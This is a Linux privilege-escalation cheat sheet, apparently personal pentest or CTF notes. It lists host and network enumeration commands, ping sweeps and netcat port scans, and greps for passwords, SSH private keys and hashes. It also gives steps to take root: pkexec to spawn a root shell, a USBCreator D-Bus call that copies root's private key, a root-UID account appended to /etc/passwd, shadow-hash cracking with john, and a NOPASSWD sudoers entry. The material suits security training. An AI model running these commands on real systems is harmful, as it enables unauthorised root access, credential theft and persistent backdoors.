---
icon: linux
---

# Linux Privilege Escalation

* ## <mark style="color:purple;">Get your own local version of this checklist</mark> [<mark style="color:orange;">`here`</mark>](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/refs/heads/master/linux-hardening/linux-privilege-escalation-checklist.md)<mark style="color:purple;">:</mark>

{% embed url="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" %}
By Carlos Palop
{% endembed %}

* ## <mark style="color:purple;">Make sure you have</mark> <mark style="color:orange;">`pspy`</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">`linpeas`</mark> <mark style="color:purple;">ready:</mark>

{% embed url="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md" %}

{% embed url="https://github.com/DominicBreuker/pspy" %}

{% hint style="info" %}
## <mark style="color:purple;">`Enumeration`</mark>

{% code title="Check sudo permissions" %}
```bash
sudo -l
```
{% endcode %}

{% code title="Check Hostname" %}
```bash
hostname -I
```
{% endcode %}

{% code title="Check the internal network" %}
```bash
ifconfig
```
{% endcode %}

{% code title="Check mounted devices" %}
```bash
mount
```
{% endcode %}

{% code title="Container processes " lineNumbers="true" %}
```bash
ps auxww | grep docker
ps auxww | grep lxd
```
{% endcode %}

{% code title="Read crontab file" %}
```sh
cat /etc/crontab
```
{% endcode %}

{% code title="Check Services running" %}
```sh
ls /etc/init.d
```
{% endcode %}

{% code title="Check System info" %}
```bash
uname -a
```
{% endcode %}

{% code title="Check groups file" %}
```sh
cat /etc/group
```
{% endcode %}

{% code title="Show listening ports" %}
```sh
netstat -tuln
```
{% endcode %}

{% code title="Listen to the localhost" %}
```sh
netstat -an -p tcp
```
{% endcode %}

{% code title="Check binaries with capabilities" %}
```bash
getcap -r / 2>/dev/null
```
{% endcode %}

{% code title="SUID/SETGID binaries" %}
```sh
find / -perm -4000 -or -perm -2000 2>/dev/null
```
{% endcode %}

{% code title=" Traces library function calls" %}
```sh
ltrace ProgramName
```
{% endcode %}

{% code title="Search Kernel for Exploits" %}
```sh
searchsploit "Linux Kernel" | grep <version>
```
{% endcode %}

***

#### <mark style="color:red;">`Scan the local network`</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Find one many hosts there are in the network by doing a</mark> <mark style="color:orange;">**`ping sweep`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
{% endcode %}

* <mark style="color:purple;">If</mark> <mark style="color:orange;">**`nc`**</mark> <mark style="color:purple;">is installed can be use to scan for open ports:</mark>

```sh
nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused | tee scan
```

{% code title="UDP scan" %}
```sh
nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
```
{% endcode %}

* <mark style="color:purple;">Other wise get a</mark> [<mark style="color:orange;">**`nmap`**</mark>](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) <mark style="color:purple;">binary.</mark>&#x20;

#### <mark style="color:red;">`Grepping files`</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Check if a user has a shell in the system:</mark>

```bash
grep "sh$" /etc/passwd
```

* <mark style="color:purple;">Search for the string</mark> <mark style="color:orange;">**`pass`**</mark> <mark style="color:purple;">(case-insensitive) in all files and directories recursively:</mark>

```sh
grep -iR "pass" * 2>/dev/null
```

* <mark style="color:purple;">Search for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**the string**</mark>**&#x20;**<mark style="color:orange;">**`password`**</mark> <mark style="color:purple;">in files with double extension, recursively:</mark>

```sh
grep password .*.* -r 2>/dev/null
```

* <mark style="color:purple;">Search for</mark> <mark style="color:orange;">**`ssh`**</mark> <mark style="color:purple;">keys recursively from the current directory you are in:</mark>

{% code overflow="wrap" %}
```sh
grep -iR -E "(ssh-(rsa|ed25519|dss|ecdsa|rsa1)[ ]+[A-Za-z0-9+/=]+|-----BEGIN [A-Z ]+PRIVATE KEY-----)" * 2>/dev/null
```
{% endcode %}

* <mark style="color:purple;">Is also possible to look for</mark> <mark style="color:orange;">**`hashes`**</mark> <mark style="color:purple;">by using regex to look for the hash length:</mark>

{% code title="MD5 hashes" %}
```sh
grep -aPo '[a-fA-F0-9]{32}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-1" %}
```sh
grep -aPo '[a-fA-F0-9]{40}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-256" %}
```sh
grep -aPo '[a-fA-F0-9]{64}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-512" %}
```sh
grep -aPo '[a-fA-F0-9]{128}' /DESIRED/PATH
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:red;">`Polkit`</mark>

* <mark style="color:purple;">Check the</mark> <mark style="color:orange;">**`sudoers`**</mark> <mark style="color:purple;">file:</mark>

```sh
cat /etc/sudoers
```

* <mark style="color:purple;">Check</mark> <mark style="color:orange;">**`polkit`**</mark> <mark style="color:purple;">policy:</mark>

```sh
cat /etc/polkit-1/localauthority.conf.d
```

{% code title="Become root" %}
```sh
pkexec "/bin/sh"
```
{% endcode %}

### <mark style="color:red;">`USBCreator`</mark>

* <mark style="color:purple;">Allows to over write files with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions</mark>

{% code title="Copy root private key" overflow="wrap" %}
```sh
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">`Important Files`</mark>

### <mark style="color:red;">`/etc/passwd`</mark>

* <mark style="color:purple;">If is possible to write the file:</mark>

{% code title="Generate the password hash" %}
```sh
openssl passwd -1 tokyo
```
{% endcode %}

{% code title="Add the line " overflow="wrap" %}
```sh
echo 'tokyo:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:tokyo:/root:/bin/bash' >> passwd
```
{% endcode %}

***

### <mark style="color:red;">`/etc/shadow`</mark>&#x20;

* <mark style="color:purple;">Crack the hash with</mark> <mark style="color:orange;">**`john`**</mark>

{% code overflow="wrap" %}
```sh
echo 'zoe:$y$j9T$Ct0y5TNQ/sv95CFPz510O/$7YtCDOBISfngZeQ3rsDkRcw2XTFDgHBkxDpuhyBLNO1:1002:1002:zoe:/home/zoe:/bin/bash' > shadowHash.txt
```
{% endcode %}

* <mark style="color:purple;">Now crack it:</mark>

{% code overflow="wrap" %}
```sh
john --wordlist=~/Documents/Wordlists/rockyou.txt shadow.txt --format=crypt
```
{% endcode %}

***

### <mark style="color:red;">**`/var/log`**</mark>

* <mark style="color:orange;">**`adm`**</mark> <mark style="color:purple;">group can read log files.</mark>

***

### <mark style="color:red;">`/etc/sudoers`</mark>

* <mark style="color:purple;">If the file is read-only, you need to change its permissions to allow write access:</mark>

```sh
chmod +w /etc/sudoers
```

* <mark style="color:purple;">Add the following line:</mark>

```
yourUser   ALL=(ALL) NOPASSWD: ALL
```

* <mark style="color:purple;">Restore the original file permissions to make it read-only again:</mark>

```sh
chmod 440 /mnt/etc/sudoers
```
{% endhint %}

***
